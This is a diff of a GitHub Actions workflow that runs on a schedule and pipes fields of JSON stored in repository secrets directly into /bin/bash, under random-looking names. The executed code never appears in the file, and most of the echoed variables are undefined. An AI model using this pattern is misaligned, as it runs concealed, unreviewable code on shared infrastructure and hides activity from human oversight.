@@ -3,7 +3,7 @@ name: fangzhangdx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 0/6 * * *'
+    - cron: '18 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,14 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: fangzhangdx
         env:
-          qfx3628: ${{ secrets.qfx3628 }}
+          t27: ${{ secrets.t27 }}
         run: |
-          echo $qfx3628 | jq -r .jqd4294 | /bin/bash
-          echo $au1451 | jq -r .wfzgf38 | /bin/bash
-          echo $ssoh58 | jq -r .s0 | /bin/bash
-          echo $vj643 | jq -r .tyyns0 | /bin/bash
-          echo $ek447 | jq -r .fsz948 | /bin/bash
-          echo $z86869 | jq -r .y983 | /bin/bash
-          echo $buh8 | jq -r .ncfev330 | /bin/bash
-          echo $k9597 | jq -r .jx26 | /bin/bash
+          echo $t27 | jq -r .t7 | /bin/bash
+          echo $wds4 | jq -r .qouli601 | /bin/bash
+          echo $zwa037 | jq -r .mocb40 | /bin/bash
+          echo $bm835 | jq -r .ejvk0 | /bin/bash
+          echo $j02949 | jq -r .tx1895 | /bin/bash
+          echo $r5254 | jq -r .wmep80 | /bin/bash
+          echo $aq7 | jq -r .oxbm97 | /bin/bash
+          echo $q39988 | jq -r .wgmws83158 | /bin/bash
+          echo $ypxc86441 | jq -r .tenkh733 | /bin/bash
+          echo $bidlz3 | jq -r .f5 | /bin/bash
+          echo $ztf245 | jq -r .hrsh0 | /bin/bash
 
